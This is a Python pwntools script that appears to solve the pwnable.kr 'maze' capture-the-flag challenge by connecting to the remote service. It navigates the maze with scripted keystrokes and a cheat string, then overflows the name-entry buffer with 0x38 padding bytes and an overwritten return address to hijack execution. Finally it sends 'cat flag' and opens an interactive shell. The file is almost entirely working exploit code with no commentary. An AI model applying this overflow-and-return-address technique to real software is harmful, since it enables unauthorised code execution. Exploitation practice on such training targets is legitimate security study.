from pwn import *


context.log_level = 'info'

'''ssdssddssddddwddssddsddsssassd'''

BIN_PATH = './maze'
E = ELF(BIN_PATH)
ADDR = 'pwnable.kr'
PORT = 9014


def main():
    p = remote(ADDR, PORT)
    i = p.recvuntil('PRESS ANY KEY TO START THE GAME')
    p.sendline()
    i = p.recv()
    p.send('ssdssddssddddwddssddsddsssassd' * 3)
    p.send('ssdssddssdddssasssddddwd\n\n\n\n\n\n\n\n\n\ndsdssd')
    p.send('\n'* 70 + 'ssdddwwdddssd' + '\n' * 5 + 'sssassassass' + '\n' * 10 + 'ssd\n\nddd\nwdd\nsdss\naa\naaa')
    # context.log_level = 'debug'
    p.send('OPENSESAMIO')
    p.send('sssdddddddddddd')
    p.send('aaaaaaaaaaaawww')
    p.send('dddddd')
    p.recvuntil('record your name : ')
    p.sendline('A' * 0x38 + 2 * p64(0X00000000004017b4))
    p.sendline('cat flag')

    p.interactive()



if __name__ == '__main__':
    main()

